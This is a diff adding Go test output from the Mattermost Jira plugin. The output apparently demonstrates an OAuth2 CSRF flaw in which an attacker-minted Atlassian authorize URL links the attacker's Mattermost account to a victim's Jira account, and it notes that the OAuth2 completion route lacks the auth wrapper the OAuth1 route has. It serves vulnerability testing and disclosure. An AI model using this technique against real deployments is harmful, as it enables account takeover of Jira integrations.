@@ -1,0 +1,11 @@
+=== RUN   TestZeroToOne_OAuth2CompleteIgnoresSessionIdentity
+    zz_zerotoone_oauth2_csrf_test.go:112: attacker-minted Atlassian authorize URL (would be sent to the victim): https://auth.atlassian.com/authorize?audience=api.atlassian.com&client_id=&code_challenge=bOEK87Sifl-XHR2h7IiBpFyQX-d0ylJE6wE-PTuiM2A&code_challenge_method=S256&prompt=consent&redirect_uri=https%3A%2F%2Fmattermost.example.com%2Fplugins%2Fjira%2Finstance%2FaHR0cHM6Ly96ZXJvdG9vbmUtdGVzdC5hdGxhc3NpYW4ubmV0%2Foauth2%2Fcomplete.html&response_type=code&scope=read%3Ajira-user+read%3Ajira-work+write%3Ajira-work+read%3Aboard-scope%3Ajira-software+read%3Aproject%3Ajira+read%3Asprint%3Ajira-software+offline_access&state=bewu8u45xtnz9cj_attacker0000000000000000000
+    zz_zerotoone_oauth2_csrf_test.go:137: httpOAuth2Complete panicked AFTER the connection was persisted, in unrelated bot/setup-flow/telemetry code (p.setupFlow/p.tracker are nil in this unit test): runtime error: invalid memory address or nil pointer dereference
+    zz_zerotoone_oauth2_csrf_test.go:159: RESULT: attacker Mattermost id "attacker0000000000000000000" is now linked to victim's real Jira account "real.victim.jira.account" (accountId=victim-real-jira-account-id), while the victim's own Mattermost account ("victim00000000000000000000000", sent in the Mattermost-User-Id header of the completing request) was never even queried.
+--- PASS: TestZeroToOne_OAuth2CompleteIgnoresSessionIdentity (0.03s)
+=== RUN   TestZeroToOne_OAuth2CompleteRouteHasNoAuthWrapper
+    zz_zerotoone_oauth2_csrf_test.go:177: routeOAuth1Complete registration: instanceRouter.HandleFunc(routeOAuth1Complete, p.checkAuth(p.handleResponseWithCallbackInstance(p.httpOAuth1aComplete))).Methods(http.MethodGet)
+    zz_zerotoone_oauth2_csrf_test.go:178: routeOAuth2Complete registration: instanceRouter.HandleFunc(routeOAuth2Complete, p.handleResponseWithCallbackInstance(p.httpOAuth2Complete)).Methods(http.MethodGet)
+--- PASS: TestZeroToOne_OAuth2CompleteRouteHasNoAuthWrapper (0.00s)
+PASS
+ok  	github.com/mattermost/mattermost-plugin-jira/server	0.201s
